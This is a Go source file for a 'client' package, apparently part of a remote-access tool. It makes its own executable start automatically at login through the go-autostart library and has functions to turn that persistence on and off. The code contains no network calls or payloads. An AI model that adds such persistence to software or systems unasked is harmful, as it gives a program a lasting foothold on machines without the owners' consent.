package client

import (
	"log"
	"os"

	"github.com/emersion/go-autostart"
)

func (c *Client) SetupPersistence() error {
	path, err := os.Executable()
	if err != nil {
		return err
	}

	c.Persistence = &autostart.App{
		Name:        c.Cfg.Name,
		DisplayName: c.Cfg.DisplayName,
		Exec:        []string{path},
	}
	return nil
}

func (c *Client) UnPersist() {
	log.Println("[+] Disabling persistence")
	err := c.Persistence.Disable()
	if err != nil {
		log.Printf("%v\n", err) // TODO: check if persistence was never enabled to begin with
		return
	}

	log.Println("[+] Persistence disabled successfully")
	return
}

func (c *Client) Persist() {
	if c.Persistence.IsEnabled() {
		log.Println("[-] Persistence was already enabled")
		return
	} else {
		log.Println("[+] Making client persistent")
		err := c.Persistence.Enable()
		if err != nil {
			log.Printf("%v\n", err)
			return
		}
	}

	log.Println("[+] Persistence enabled successfully")
	return
}
